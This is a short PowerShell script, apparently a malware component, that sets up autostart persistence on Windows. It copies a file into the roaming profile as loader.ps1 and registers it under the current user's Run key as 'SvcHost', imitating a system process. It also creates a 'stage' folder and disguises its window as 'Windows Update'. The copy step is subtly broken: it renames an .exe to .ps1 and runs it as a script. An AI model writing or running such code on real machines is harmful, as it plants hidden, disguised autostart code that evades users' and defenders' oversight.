
<#
.SYNOPSIS
    Per-user Run-key persistence helper.

.DESCRIPTION
    Copies the launcher into the roaming profile and
    registers it under the current user's Run key.
#>
$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegistryValue = 'SvcHost'
$PersistencePath = "$env:APPDATA\loader.ps1"
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path "$env:APPDATA\updater.exe" -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
$OperationResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
Write-Verbose ("Registered value: " + $OperationResult.$RegistryValue)

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
